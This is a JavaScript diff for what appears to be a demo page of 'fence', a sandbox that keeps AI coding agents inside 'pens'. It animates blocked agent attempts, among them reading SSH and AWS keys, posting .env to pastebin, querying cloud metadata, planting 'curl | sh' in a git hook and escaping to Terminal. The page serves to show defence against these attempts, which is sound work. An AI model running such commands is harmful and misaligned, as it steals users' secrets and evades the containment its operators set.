-      [[x + w, y], [x + w, gate.y - gate.half]], [[x + w, gate.y + gate.half], [x + w, y + h]],
-    ];
+    const segs = [[[x, y], [x + w, y]], [[x, y + h], [x + w, y + h]], [[x, y], [x, y + h]], [[x + w, y], [x + w, gate.y - gate.half]], [[x + w, gate.y + gate.half], [x + w, y + h]]];
     ctx.lineCap = "round";
-    for (const [off, col, lw] of [[3, "rgba(2,6,14,.45)", 7], [0, "#6E4E2E", 6], [-1.5, "#B98A55", 2.6]]) {
+    for (const [dx, dy, col, lw] of [[3, 4, "rgba(2,6,14,.45)", 8], [0, -2, "#7A5632", 3.2], [0, 2, "#7A5632", 3.2], [0, -2.5, "#C79A63", 1.4], [0, 1.5, "#C79A63", 1.4]]) {
       ctx.strokeStyle = col; ctx.lineWidth = lw;
       ctx.beginPath();
-      for (const [a, b] of segs) { ctx.moveTo(a[0] + off, a[1] + off); ctx.lineTo(b[0] + off, b[1] + off); }
+      for (const [a, b] of segs) { ctx.moveTo(a[0] + dx, a[1] + dy); ctx.lineTo(b[0] + dx, b[1] + dy); }
       ctx.stroke();
     }
-    // posts
     const posts = [];
-    const along = (a, b) => { const len = Math.hypot(b[0] - a[0], b[1] - a[1]), n = Math.max(1, Math.round(len / 46)); for (let i = 0; i <= n; i++) posts.push([a[0] + (b[0] - a[0]) * i / n, a[1] + (b[1] - a[1]) * i / n]); };
-    segs.forEach(([a, b]) => along(a, b));
+    for (const [a, b] of segs) { const len = Math.hypot(b[0] - a[0], b[1] - a[1]), n = Math.max(1, Math.round(len / 52)); for (let i = 0; i <= n; i++) posts.push([a[0] + (b[0] - a[0]) * i / n, a[1] + (b[1] - a[1]) * i / n]); }
     for (const [px, py] of posts) {
-      ctx.fillStyle = "rgba(2,6,14,.5)"; ctx.fillRect(px - 3, py - 2, 9, 9);
-      ctx.fillStyle = "#5A3F25"; ctx.fillRect(px - 4.5, py - 4.5, 9, 9);
-      ctx.fillStyle = "#8C6A44"; ctx.fillRect(px - 3, py - 3, 6, 6);
+      ctx.fillStyle = "rgba(2,6,14,.5)"; ctx.beginPath(); ctx.arc(px + 3, py + 4, 6, 0, 7); ctx.fill();
+      ctx.fillStyle = "#5A3F25"; ctx.beginPath(); ctx.arc(px, py, 5.5, 0, 7); ctx.fill();
+      ctx.fillStyle = "#9C7144"; ctx.beginPath(); ctx.arc(px - .8, py - .8, 3.4, 0, 7); ctx.fill();
     }
-    // the gate: amber posts and a swung-open bar
     const gx = x + w;
     for (const gy of [gate.y - gate.half, gate.y + gate.half]) {
-      ctx.fillStyle = "#F5B544"; ctx.fillRect(gx - 5, gy - 5, 10, 10);
+      ctx.fillStyle = "#F5B544"; ctx.beginPath(); ctx.arc(gx, gy, 6, 0, 7); ctx.fill();
     }
-    ctx.strokeStyle = "rgba(245,181,68,.8)"; ctx.lineWidth = 3;
-    ctx.beginPath(); ctx.moveTo(gx, gate.y - gate.half); ctx.lineTo(gx + 26, gate.y - gate.half - 30); ctx.stroke();
+    ctx.strokeStyle = "rgba(245,181,68,.85)"; ctx.lineWidth = 3;
+    ctx.beginPath(); ctx.moveTo(gx, gate.y - gate.half); ctx.lineTo(gx + 22, gate.y - gate.half - 26); ctx.stroke();
     ctx.font = "500 11px JetBrains Mono, monospace"; ctx.fillStyle = "rgba(245,181,68,.75)";
     ctx.fillText("gate", gx + 40 < W ? gx + 12 : gx - 40, gate.y + gate.half + 20);
-    // red flashes where a sheep met the fence
     for (const f of flashes) {
-      const age = (now - f.born) / 900;
+      const age = (now - f.born) / 1000;
       if (age > 1) continue;
-      ctx.strokeStyle = `rgba(248,113,113,${.8 * (1 - age)})`; ctx.lineWidth = 2;
-      ctx.beginPath(); ctx.arc(f.x, f.y, 8 + age * 22, 0, 7); ctx.stroke();
+      ctx.strokeStyle = `rgba(248,113,113,${.85 * (1 - age)})`; ctx.lineWidth = 2;
+      ctx.beginPath(); ctx.arc(f.x, f.y, 8 + age * 26, 0, 7); ctx.stroke();
     }
-    flashes = flashes.filter((f) => now - f.born < 900);
+    flashes = flashes.filter((f) => now - f.born < 1000);
   }
-
   function drawLabel(x, y, text, bad, alpha) {
     ctx.font = "500 12px JetBrains Mono, monospace";
     const tw = ctx.measureText(text).width;
-    const lx = Math.min(Math.max(x - tw / 2 - 9, 8), W - tw - 26), ly = y - 40;
+    const lx = Math.min(Math.max(x - tw / 2 - 9, 8), W - tw - 26), ly = Math.max(66, y - 40);
     ctx.globalAlpha = alpha;
-    ctx.fillStyle = "rgba(11,20,34,.9)"; ctx.strokeStyle = bad ? "rgba(248,113,113,.55)" : "rgba(74,222,128,.5)"; ctx.lineWidth = 1;
+    ctx.fillStyle = "rgba(11,20,34,.92)"; ctx.strokeStyle = bad ? "rgba(248,113,113,.6)" : "rgba(74,222,128,.5)"; ctx.lineWidth = 1;
     ctx.beginPath(); ctx.roundRect(lx, ly, tw + 18, 24, 12); ctx.fill(); ctx.stroke();
     ctx.fillStyle = bad ? "#FCA5A5" : "#86EFAC"; ctx.fillText(text, lx + 9, ly + 16);
     ctx.globalAlpha = 1;
   }
-
   function frame(now) {
     const t = now / 1000, dt = Math.min(.05, (now - (frame.last || now)) / 1000); frame.last = now;
     if (!reduced) step(dt);
@@ -625,102 +1022,178 @@ const field = (() => {
     }
     for (const s of sheep) drawSheep(s, t);
     drawFence(now);
-    // requests heading out through the gate
     for (const p of packets) {
-      const seg = Math.min(1, Math.floor(p.t)), u = p.t - seg, [a, b] = [p.path[seg], p.path[seg + 1]];
-      const px = a[0] + (b[0] - a[0]) * Math.min(1, u), py = a[1] + (b[1] - a[1]) * Math.min(1, u);
-      ctx.fillStyle = `rgba(74,222,128,${p.t > 1.6 ? (2 - p.t) / .4 : 1})`;
+      const [a, b] = p.t < 1 ? [p.a, p.b] : [p.b, p.c], u = p.t < 1 ? p.t : p.t - 1;
+      const px = a[0] + (b[0] - a[0]) * u, py = a[1] + (b[1] - a[1]) * u;
+      ctx.fillStyle = `rgba(134,239,172,${p.t > 1.6 ? (2 - p.t) / .4 : 1})`;
+      ctx.shadowColor = "rgba(74,222,128,.8)"; ctx.shadowBlur = 10;
       ctx.beginPath(); ctx.arc(px, py, 3.2, 0, 7); ctx.fill();
-      if (seg === 1 && !p.labelled) { p.labelled = true; labels.push({ x: pen.x + pen.w + 10, y: pen.gate.y - 6, text: `✓ ${p.text}`, born: now, bad: false }); }
+      ctx.shadowBlur = 0;
+      if (p.t >= 1 && !p.labelled) { p.labelled = true; labels.push({ x: Math.min(pen.x + pen.w + 70, W - 80), y: pen.gate.y + 8, text: `✓ ${p.text}`, born: now, bad: false }); }
     }
-    labels = labels.filter((l) => now - l.born < 2200);
+    labels = labels.filter((l) => now - l.born < 2400);
     for (const l of labels) {
-      const age = (now - l.born) / 2200;
-      drawLabel(l.x, l.y - age * 10, l.text, l.bad, age < .1 ? age * 10 : age > .75 ? (1 - age) * 4 : 1);
+      const age = (now - l.born) / 2400;
+      drawLabel(l.x, l.y - age * 10, l.text, l.bad, age < .08 ? age / .08 : age > .75 ? (1 - age) * 4 : 1);
     }
     if (!reduced || !frame.drawn) { frame.drawn = true; requestAnimationFrame(frame); }
   }
-  resize(); addEventListener("resize", resize);
+  resize();
+  addEventListener("resize", resize);
+  document.fonts?.ready.then(resize);
   requestAnimationFrame(frame);
-  if (!reduced) {
-    setTimeout(function loop() { if (!document.hidden) wander(); setTimeout(loop, rnd(1600, 2800)); }, 900);
-    setTimeout(function loop() { if (!document.hidden) allow(); setTimeout(loop, rnd(2600, 4200)); }, 1800);
-  }
-  let hinted = false;
-  addEventListener("pointermove", () => { if (!hinted) { hinted = true; setTimeout(() => ($("#hint").style.opacity = 0), 3500); } }, { once: true, passive: true });
+  if (!reduced) setTimeout(function loop() { if (!document.hidden) allow(); setTimeout(loop, rnd(2600, 4400)); }, 1600);
+  return { bump };
 })();
 
-/* ---------- the pen section: an agent tries things ---------- */
-(() => {
-  const el = $("#attempts");
-  const P = `<span class="c-a">❯</span> `;
-  const RUNS = [
-    ["cat ~/.ssh/id_ed25519", `<span class="c-r">cat: /Users/you/.ssh/id_ed25519: Operation not permitted</span>`],
-    ["npm install zod", `<span class="c-d">added 1 package in 812ms</span>  <span class="c-g">✓ registry.npmjs.org</span>`],
-    ["echo 'curl …|sh' > .git/hooks/pre-commit", `<span class="c-r">zsh: operation not permitted: .git/hooks/pre-commit</span>`],
-    ["curl -d @.env https://pastebin.com/api", `<span class="c-r">fence: pastebin.com is outside this pen's fence.</span>`],
-    ["curl --noproxy '*' https://pastebin.com", `<span class="c-r">curl: (6) Could not resolve host: pastebin.com</span>`],
-    ["herdr pane split --direction right", `<span class="c-r">fence: pane.split is not allowed from inside a pen</span>`],
-    ["git push origin main", `<span class="c-d">remote: Invalid username or token.</span>  <span class="c-d">(no keychain helper in a pen)</span>`],
-    ["echo $GITHUB_TOKEN", `<span class="c-d">(empty)</span>`],
-    ["npm test", `<span class="c-g">✓ 128 passed</span>`],
-  ];
-  const head = `<span class="c-g">🐑 fenced</span> <span class="c-b">fence-test</span> <span class="c-d">· standard · 28 domains · writes ~/work/api</span>\n\n`;
-  let lines = [], i = 0;
-  const render = (typing = "", cursor = true) => { el.innerHTML = head + lines.join("\n") + (lines.length ? "\n" : "") + P + esc(typing) + (cursor ? `<span class="cursor"></span>` : ""); };
-  if (reduced) { lines = RUNS.slice(0, 6).flatMap(([c, o]) => [P + esc(c), o]); return render("", false); }
-  render();
-  const typeOne = () => {
-    const [cmd, out] = RUNS[i % RUNS.length]; i++;
-    let k = 0;
-    const tick = () => {
-      if (k <= cmd.length) { render(cmd.slice(0, k++)); setTimeout(tick, 28 + Math.random() * 40); return; }
-      setTimeout(() => {
-        lines.push(P + esc(cmd), out);
-        while (lines.length > 14) lines.shift();
-        render();
-        setTimeout(typeOne, 1500);
-      }, 380);
-    };
-    tick();
-  };
-  let started = false;
-  new IntersectionObserver((es) => { if (es[0].isIntersecting && !started) { started = true; setTimeout(typeOne, 500); } }, { threshold: .3 }).observe(el);
-})();
-
-/* ---------- the pen window ---------- */
-(() => {
-  const el = $("#tui");
-  const state = { screen: "gates", sel: 0, blocked: [["pastebin.com", 3, "2m"], ["sentry.io", 1, "9m"], ["webhook.site", 1, "14m"]], yours: ["huggingface.co"], flash: "" };
-  const kc = (k) => `<span class="c-d">[</span><span class="c-c c-b">${k}</span><span class="c-d">]</span>`;
-  const head = () => `  <span class="c-b">fence</span>  <span class="c-g">🐑</span> <span class="c-b">fence-test</span>\n<span class="c-d">${"─".repeat(64)}</span>\n\n`;
-  function gates() {
-    let out = "", n = 0;
-    if (state.blocked.length) out += `  <span class="c-b">Stopped lately</span>\n`;
-    for (const [d, c, w] of state.blocked) {
-      const sel = n === state.sel;
-      out += `<span class="row${sel ? " sel" : ""}" data-i="${n}">${sel ? `<span class="c-c"> › </span>` : "   "}<span class="c-r">✗</span> ${(d + " ".repeat(34)).slice(0, 34)}<span class="c-d">${c}× · ${w} ago</span>${sel ? `  <button class="act" data-a="${n}">a let through</button>` : ""}</span>`;
-      n++;
+/* ---------- ways out ---------- */
+const SCEN = {
+  work: {
+    cap: "<b>Doing the work.</b> Packages, code, tests and status all fit inside the pen.",
+    agent: `<span class="c-d">$</span> npm install zod && npm test\n<span class="c-gh">added 1 package · ✓ 128 passed</span>`,
+    you: `<span class="c-d">nothing. No toasts while it just works.</span>`,
+    lanes: [
+      ["npm install zod", true, "registry.npmjs.org ✓"],
+      ["write src/routes/users.ts", true, "the pen's folder ✓"],
+      ["git clone github.com/acme/sdk", true, "github.com ✓"],
+      ["tell herdr: working", true, "its own pane ✓"],
+    ] },
+  exfil: {
+    cap: "<b>Sending something out.</b> Off the list, around the proxy or to this machine: all stopped.",
+    agent: `<span class="c-d">$</span> curl -d @.env https://pastebin.com/api\n<span class="c-rh">fence: pastebin.com is outside this pen's fence.</span>`,
+    you: `🐑 blocked pastebin.com\n<span class="c-d">api · prefix+p to see the pen</span>`,
+    lanes: [
+      ["curl -d @.env pastebin.com", false, "✗ not on the list"],
+      ["curl --noproxy '*' pastebin.com", false, "✗ no route but the proxy"],
+      ["curl localhost:4777", false, "✗ this machine"],
+      ["curl 169.254.169.254/latest", false, "✗ cloud metadata"],
+    ] },
+  keys: {
+    cap: "<b>Reaching for secrets.</b> Hidden from the pen, or never handed to it.",
+    agent: `<span class="c-d">$</span> cat ~/.ssh/id_ed25519\n<span class="c-rh">cat: /Users/you/.ssh/id_ed25519: Operation not permitted</span>`,
+    you: `🐑 blocked reading ~/.ssh/id_ed25519\n<span class="c-d">api · cat · prefix+p to see the pen</span>`,
+    lanes: [
+      ["cat ~/.ssh/id_ed25519", false, "✗ hidden"],
+      ["cat ~/.aws/credentials", false, "✗ hidden"],
+      ["echo $GITHUB_TOKEN", false, "✗ not in the pen's env"],
+      ["git push (keychain helper)", false, "✗ no credential helper"],
+    ] },
+  escape: {
+    cap: "<b>Getting out of the pen.</b> Every way to run something outside it is shut.",
+    agent: `<span class="c-d">$</span> herdr pane split --direction right\n<span class="c-rh">fence: pane.split is not allowed from inside a pen</span>`,
+    you: `🐑 blocked herdr pane.split\n<span class="c-d">api · prefix+p to see the pen</span>`,
+    lanes: [
+      ["herdr pane split", false, "✗ the herdr gate"],
+      ["herdr pane send-text w2:p1", false, "✗ the herdr gate"],
+      ["osascript → Terminal", false, "✗ no Apple Events"],
+      ["open -a Terminal", false, "✗ no LaunchServices"],
+    ] },
+  trap: {
+    cap: "<b>Leaving something to run later, outside.</b> Read-only, or a tripwire you hear about.",
+    agent: `<span class="c-d">$</span> echo 'curl … | sh' > .git/hooks/pre-commit\n<span class="c-rh">zsh: operation not permitted: .git/hooks/pre-commit</span>`,
+    you: `🐑 blocked writing .git/hooks/pre-commit\n<span class="c-d">api · zsh · prefix+p to see the pen</span>`,
+    lanes: [
+      [".git/hooks/pre-commit", false, "✗ read-only"],
+      [".claude/settings.json hooks", false, "✗ read-only"],
+      ["~/.zshrc", false, "✗ read-only"],
+      ["mcpServers in ~/.claude.json", null, "⚠ tripwire: you're told"],
+    ] },
+};
+let routeRun = 0, routeAuto = true, routeIdx = 0;
+async function runRoute(key) {
+  const id = ++routeRun, sc = SCEN[key];
+  $$("#seg button").forEach((b) => b.classList.toggle("on", b.dataset.s === key));
+  const cap = $("#mapcap"), agentOut = $("#seeAgent"), youOut = $("#seeYou");
+  [cap, agentOut, youOut].forEach((e) => (e.style.opacity = 0));
+  $("#nOut").classList.remove("lit", "hit"); $("#nIn").classList.remove("hit");
+  const lanes = $$(".lane");
+  lanes.forEach((l, i) => {
+    l.className = "lane";
+    $("b", l).textContent = sc.lanes[i][0];
+    $(".res", l).textContent = "";
+    $$(".fill, .stub, .pk, .boom", l).forEach((x) => x.getAnimations().forEach((a) => a.cancel()));
+  });
+  await sleep(300);
+  if (id !== routeRun) return;
+  const fenceAt = .58;
+  const anims = lanes.map(async (l, i) => {
+    const [, ok, res] = sc.lanes[i];
+    await sleep(i * 260);
+    if (id !== routeRun) return;
+    const pk = $(".pk", l), dur = reduced ? 1 : 900;
+    if (ok) {
+      await pk.animate([{ left: "0%", opacity: 1 }, { left: "100%", opacity: 1 }], { duration: dur * 1.5, easing: "cubic-bezier(.4,0,.6,1)", fill: "forwards" }).finished.catch(() => {});
+      if (id !== routeRun) return;
+      pk.animate([{ opacity: 1 }, { opacity: 0 }], { duration: 200, fill: "forwards" });
+      l.classList.add("ok"); $(".res", l).textContent = res;
+      $(".fill", l).animate([{ transform: "scaleX(0)" }, { transform: "scaleX(1)" }], { duration: 600, easing: "cubic-bezier(.2,.8,.2,1)", fill: "forwards" });
+      $("#nOut").classList.add("lit");
+    } else {
+      await pk.animate([{ left: "0%", opacity: 1 }, { left: `${fenceAt * 100 - 1}%`, opacity: 1 }], { duration: dur, easing: "cubic-bezier(.4,0,.8,1)", fill: "forwards" }).finished.catch(() => {});
+      if (id !== routeRun) return;
+      pk.animate([{ opacity: 1, transform: "scale(1)" }, { opacity: 0, transform: "scale(.2)" }], { duration: 260, fill: "forwards" });
+      $(".boom", l).animate([{ opacity: 1, transform: "scale(.3)" }, { opacity: 0, transform: "scale(1.4)" }], { duration: 700, easing: "ease-out", fill: "forwards" });
+      $(".stub", l).animate([{ transform: "scaleX(0)" }, { transform: "scaleX(1)" }], { duration: 500, easing: "cubic-bezier(.2,.8,.2,1)", fill: "forwards" });
+      l.classList.add("no"); $(".res", l).textContent = res;
+      if (ok === null) { $(".res", l).style.color = "var(--amber-hi)"; } else $(".res", l).style.color = "";
+      $("#nIn").classList.add("hit");
     }
-    if (!state.blocked.length) out += `  <span class="c-d">Nothing stopped at the fence lately.</span>\n`;
-    out += `\n  <span class="c-b">Let through by you</span>\n`;
-    for (const d of state.yours) out += `   <span class="c-g">✓</span> ${d}\n`;
-    out += `\n  <span class="c-b">From the standard profile</span>\n`;
-    out += ["api.anthropic.com", "*.anthropic.com", "registry.npmjs.org", "github.com", "…24 more"].map((d) => `   <span class="c-d">✓ ${d}</span>`).join("\n");
-    return out;
+  });
+  await Promise.allSettled(anims);
+  if (id !== routeRun) return;
+  cap.innerHTML = sc.cap; agentOut.innerHTML = sc.agent; youOut.innerHTML = sc.you;
+  [cap, agentOut, youOut].forEach((e) => (e.style.opacity = 1));
+}
+$$("#seg button").forEach((b) => b.addEventListener("click", () => { routeAuto = false; runRoute(b.dataset.s); }));
+let routeStarted = false;
+whenVisible($("#map"), async (v) => {
+  if (!v || routeStarted) return;
+  routeStarted = true;
+  const keys = Object.keys(SCEN);
+  while (routeAuto) {
+    await runRoute(keys[routeIdx]);
+    await sleep(3600);
+    if (!routeAuto) break;
+    routeIdx = (routeIdx + 1) % keys.length;
+  }
+}, .35);
+
+/* ---------- gates: the pen window, playing itself ---------- */
+{
+  const el = $("#tui"), ptoast = $("#ptoast");
+  const st = { screen: "gates", sel: 0, blocked: [["pastebin.com", 3, "2m"], ["sentry.io", 1, "9m"]], yours: [], flash: "", fresh: null, gone: null, key: null };
+  const kc = (k) => `<span class="kc">[<b>${k}</b>]</span>`;
+  const tab = (s, k, label) => (st.screen === s ? `${kc(k)} <span class="c-b" style="text-decoration:underline">${label}</span>` : `<span class="tab c-d" data-s="${s}">[${k}] ${label}</span>`);
+  const pad = (s, n) => (s + " ".repeat(n)).slice(0, n);
+  function gates() {
+    const out = [];
+    if (st.blocked.length) out.push(`  <span class="c-b">Stopped lately</span>`);
+    else out.push(`  <span class="c-d">Nothing stopped at the fence lately.</span>`);
+    st.blocked.forEach(([d, c, w], i) => {
+      const sel = i === st.sel;
+      const cls = ["row", sel && "sel", st.fresh === d && "new", st.gone === d && "gone"].filter(Boolean).join(" ");
+      out.push(`<span class="${cls}" data-i="${i}">${sel ? `<span class="c-c"> › </span>` : "   "}<span class="c-r">✗</span> ${sel ? `<span class="c-b">${pad(d, 30)}</span>` : pad(d, 30)}<span class="c-d">${c}× · ${w} ago</span></span>`);
+    });
+    out.push("", `  <span class="c-b">Let through by you</span>`);
+    if (!st.yours.length) out.push(`  <span class="c-d">none yet</span>`);
+    for (const d of st.yours) out.push(`<span class="row${st.fresh === d ? " new" : ""}">   <span class="c-g">✓</span> ${d}</span>`);
+    out.push("", `  <span class="c-b">From the standard profile</span>`);
+    for (const d of ["api.anthropic.com", "*.anthropic.com", "registry.npmjs.org", "github.com"]) out.push(`   <span class="c-d">✓ ${d}</span>`);
+    out.push(`   <span class="c-d">  …and 24 more</span>`);
+    return out.join("\n");
   }
   function pen() {
     return [
-      `  <span class="c-d">Pen          </span><span class="c-b">fence-test</span>  <span class="c-d">a1119b47 · space w4</span>`,
+      `  <span class="c-d">Pen          </span><span class="c-b">api</span>  <span class="c-d">3f9c21aa · space w4</span>`,
       `  <span class="c-d">Folder       </span>~/work/api`,
-      `  <span class="c-d">Profile      </span><span class="c-b">standard</span>  <span class="c-d">strict, plus package registries and GitHub</span>`,
-      `  <span class="c-d">Network      </span>28 domains + ${state.yours.length} you let through`,
+      `  <span class="c-d">Profile      </span><span class="c-b">standard</span>  <span class="c-d">strict, plus registries and GitHub</span>`,
+      `  <span class="c-d">Network      </span>28 domains${st.yours.length ? ` + ${st.yours.length} you let through` : ""}`,
       "",
       `  <span class="c-d">Panes        </span>w4:p1    <span class="c-g">● fenced</span><span class="c-d"> · claude</span>`,
       `  <span class="c-d">             </span>w4:p2    <span class="c-g">● fenced</span><span class="c-d"> · codex</span>`,
       `  <span class="c-d">             </span>w4:p3    <span class="c-g">● fenced</span>`,
       "",
-      `  <span class="c-d">Stopped      </span>${state.blocked.reduce((a, b) => a + b[1], 0) + 4} times<span class="c-d"> · last pastebin.com, today 14:02</span>`,
+      `  <span class="c-d">Stopped      </span>${st.blocked.reduce((a, b) => a + b[1], 0) + 4} times<span class="c-d"> · last ${st.blocked[0]?.[0] ?? "pastebin.com"}, today 14:02</span>`,
     ].join("\n");
   }
   function log() {
@@ -728,57 +1201,145 @@ const field = (() => {
       ["14:01:52", "let in ", "net", "api.anthropic.com", "c-g"],
       ["14:01:58", "let in ", "net", "registry.npmjs.org", "c-g"],
       ["14:02:03", "stopped", "file", "~/.ssh/id_ed25519  cat: file-read-data", "c-r"],
-      ["14:02:07", "stopped", "file", "~/work/api/.git/hooks/pre-commit  zsh: file-write-create", "c-r"],
+      ["14:02:07", "stopped", "file", ".git/hooks/pre-commit  zsh: file-write", "c-r"],
       ["14:02:11", "stopped", "net", "pastebin.com", "c-r"],
-      ["14:02:15", "stopped", "herdr", "pane.split  not allowed from inside a pen", "c-r"],
+      ["14:02:15", "stopped", "herdr", "pane.split", "c-r"],
       ["14:02:20", "changed", "tripwire", "~/.claude.json#mcpServers", "c-a"],
-    ].map(([t, v, k, x, c]) => `  <span class="c-d">${t}</span>  <span class="${c}">${v}</span>  ${(k + "         ").slice(0, 9)}${esc(x)}`).join("\n");
+      ...st.yours.map((d) => ["14:03:41", "·      ", "info", `let through ${d}`, "c-d"]),
+    ].map(([t, v, k, x, c]) => `  <span class="c-d">${t}</span>  <span class="${c}">${v}</span>  ${pad(k, 9)}${esc(x)}`).join("\n");
   }
-  const hints = { gates: [["↑↓", "select"], ["a", "let through"], ["x", "fence off"], ["+", "add"]], pen: [["p", "profile"], ["f", "fence panes"], ["u", "unfence"]], log: [["q", "close"]] };
+  const HINTS = { gates: [["↑↓", "select"], ["a", "let through"], ["x", "fence off"], ["q", "close"]], pen: [["p", "profile"], ["f", "fence panes"], ["u", "unfence"], ["q", "close"]], log: [["q", "close"]] };
   function render() {
-    const body = state.screen === "gates" ? gates() : state.screen === "pen" ? pen() : log();
-    const msg = state.flash ? `\n\n  <span class="c-g">${state.flash}</span>` : "\n\n";
-    el.innerHTML = head() + body + msg + "\n  " + hints[state.screen].map(([k, w]) => `${kc(k)} <span class="c-d">${w}</span>`).join("  ");
-    document.querySelectorAll("#tuiTabs button").forEach((b) => b.classList.toggle("on", b.dataset.s === state.screen));
+    const body = st.screen === "gates" ? gates() : st.screen === "pen" ? pen() : log();
+    const lines = body.split("\n");
+    while (lines.length < 15) lines.push("");
+    const flash = st.flash ? `  <span class="c-g">${st.flash}</span>` : st.key ? `  <span class="c-d">pressed</span> <span class="press">${st.key}</span>` : "";
+    el.innerHTML = [
+      `  <span class="c-b">fence</span>  <span class="c-g">🐑</span> <span class="c-b">api</span>`, "",
+      `  ${tab("pen", "o", "Pen")}   ${tab("gates", "g", "Gates")}   ${tab("log", "l", "Log")}`,
+      `<span class="c-d">${"─".repeat(72)}</span>`, "",
+      ...lines, flash,
+      "  " + HINTS[st.screen].map(([k, w]) => `${kc(k)} <span class="c-d">${w}</span>`).join("  "),
+    ].join("\n");
   }
   function letThrough(i) {
-    const [d] = state.blocked.splice(i, 1);
-    state.yours.push(d);
-    state.sel = Math.max(0, Math.min(state.sel, state.blocked.length - 1));
-    state.flash = `${d} is let through. It works at once, in every pane of fence-test.`;
-    render();
+    const d = st.blocked[i]?.[0];
+    if (!d) return;
+    st.gone = d; render();
+    setTimeout(() => {
+      st.blocked.splice(i, 1); st.yours.push(d); st.gone = null; st.fresh = d;
+      st.sel = Math.max(0, Math.min(st.sel, st.blocked.length - 1));
+      st.flash = `${d} let through, in every pane at once`;
+      render();
+      setTimeout(() => { st.fresh = null; }, 500);
+    }, 420);
   }
   el.addEventListener("click", (e) => {
-    const a = e.target.closest("[data-a]");
-    if (a) return letThrough(Number(a.dataset.a));
-    const row = e.target.closest(".row");
-    if (row) { state.sel = Number(row.dataset.i); state.flash = ""; render(); }
+    const t = e.target.closest(".tab");
+    if (t) { st.screen = t.dataset.s; st.flash = ""; return render(); }
+    const row = e.target.closest(".row[data-i]");
+    if (!row) return;
+    const i = Number(row.dataset.i);
+    if (i === st.sel) letThrough(i); else { st.sel = i; st.flash = ""; render(); }
   });
-  $("#tuiTabs").addEventListener("click", (e) => { const b = e.target.closest("button"); if (b) { state.screen = b.dataset.s; state.flash = ""; render(); } });
   render();
-})();
+  // play once: a toast, prefix+p, select it, let it through
+  let played = false;
+  whenVisible($("#pwin"), async (v) => {
+    if (!v || played) return;
+    played = true;
+    await sleep(800);
+    $("#ptoastT").textContent = "🐑 blocked huggingface.co";
+    ptoast.classList.add("on");
+    await sleep(1600);
+    ptoast.classList.remove("on");
+    st.blocked.unshift(["huggingface.co", 1, "now"]); st.fresh = "huggingface.co"; st.sel = 0; st.key = "prefix+p"; render();
+    st.fresh = null;
+    await sleep(1400);
+    st.key = "a"; render();
+    await sleep(500);
+    st.key = null; letThrough(0);
+    await sleep(3400);
+    st.flash = "click a row, then click it again to let it through";
+    render();
+  }, .45);
+}
 
-/* ---------- setup shell ---------- */
-(() => {
-  const el = $("#setupShell");
-  const P = `<span class="c-a">❯</span> `;
-  const script = [
-    [P + "herdr plugin install zenodea/fence", `<span class="c-d">installed fence 0.1.0</span>`],
-    [P + "fence new --profile standard", `api is a pen (standard)`],
-    [P + "fence status", `<span class="c-b">api</span> <span class="c-d">3f9c21aa · space w4 · standard · ~/work/api</span>\n  w4:p1  <span class="c-g">fenced</span>\n  w4:p2  <span class="c-g">fenced</span>`],
-    [P + "fence allow huggingface.co", `api: huggingface.co let through`],
-    [P + "fence policy --profile strict | head -4", `pen       fence run\nprofile   strict\nfolder    ~/work/api\n`],
-  ];
-  if (reduced) { el.innerHTML = script.map(([c, o]) => c + "\n" + o).join("\n"); return; }
-  let shown = [], i = 0;
-  const step = () => {
-    if (i >= script.length) { setTimeout(() => { shown = []; i = 0; el.innerHTML = ""; step(); }, 4000); return; }
-    shown.push(script[i][0], script[i][1]); i++;
-    el.innerHTML = shown.join("\n") + "\n" + P + `<span class="cursor"></span>`;
-    setTimeout(step, 1500);
+/* ---------- how: macOS or Linux ---------- */
+{
+  const sw = $("#osw"), knob = $(".knob", sw), buttons = $$("button", sw);
+  const setOS = (os) => {
+    for (const b of buttons) { const on = b.dataset.os === os; b.classList.toggle("on", on); b.setAttribute("aria-selected", String(on)); }
+    const on = buttons.find((b) => b.dataset.os === os);
+    knob.style.width = `${on.offsetWidth}px`;
+    knob.style.transform = `translateX(${on.offsetLeft - 4}px)`;
+    knob.style.left = "4px";
+    $("#codeMac").hidden = os !== "mac"; $("#codeLinux").hidden = os !== "linux";
+    $("#codeTitle").textContent = os === "mac" ? "fence policy --sandbox · Seatbelt" : "fence policy --sandbox · bubblewrap";
   };
+  let os = /Linux/.test(navigator.platform) && !/Android/.test(navigator.userAgent) ? "linux" : "mac";
+  for (const b of buttons) b.addEventListener("click", () => setOS((os = b.dataset.os)));
+  setOS(os);
+  document.fonts?.ready.then(() => setOS(os));
+  addEventListener("resize", () => setOS(os));
+}
+
+/* ---------- setup: a shell that becomes the pen window ---------- */
+{
+  const shell = $("#shell");
   let started = false;
-  new IntersectionObserver((es) => { if (es[0].isIntersecting && !started) { started = true; step(); } }, { threshold: .3 }).observe(el);
+  whenVisible(shell, async (v) => {
+    if (!v || started) return;
+    started = true;
+    const type = async (txt) => {
+      const sp = document.createElement("span"); shell.append(sp);
+      const caret = document.createElement("span"); caret.className = "caret"; shell.append(caret);
+      for (const ch of txt) { sp.textContent += ch; await sleep(reduced ? 0 : 22 + Math.random() * 40); }
+      await sleep(380); caret.remove();
+    };
+    const out = (html) => { const s = document.createElement("span"); s.innerHTML = html; shell.append(s); };
+    out('<span class="p">$</span> '); await type("herdr plugin install zenodea/fence");
+    out('\n<span class="k">  no build step: fence has no dependencies</span>\n  Installed fence 0.1.0\n'); await sleep(500);
+    out('<span class="p">$</span> '); await type("fence profiles");
+    out('\n  <b>open</b>       standard\'s files, any domain (still logged)\n  <b>standard</b>   strict, plus package registries and GitHub\n  <b>strict</b>     Write the pen\'s folder, reach only the agents\' model APIs\n'); await sleep(700);
+    out('<span class="p">$</span> '); await type("fence new --profile standard");
+    out('\n  api is a pen (standard)\n'); await sleep(900);
+    // the new space opens, already fenced
+    $("#shellBox").classList.add("herdr"); $("#shellTitle").textContent = "herdr · 🐑 api";
+    shell.textContent = "";
+    out('<span style="color:var(--green)">🐑 fenced</span> <b>api</b> <span class="k">· standard · 28 domains · writes ~/work/api</span>\n');
+    out('<span class="p">❯</span> '); await type("claude");
+    await sleep(500);
+    out('\n\n<span style="color:var(--claude)">✻</span> Welcome to Claude Code\n\n<span class="k">  cwd: ~/work/api</span>\n\n<span class="k">&gt;</span> ');
+    await type("add rate limiting to the users route");
+    out('\n\n<span style="color:var(--claude)">⏺</span> Bash(npm install express-rate-limit)\n<span class="k">  ⎿ added 1 package in 640ms</span>  <span style="color:var(--green-hi)">✓ registry.npmjs.org</span>\n');
+    await sleep(900);
+    out('<span style="color:var(--claude)">⏺</span> Update(src/routes/users.ts)\n<span class="k">  ⎿ +12 -1</span>\n');
+    const c = document.createElement("span"); c.className = "caret"; shell.append(c);
+  }, .3);
+}
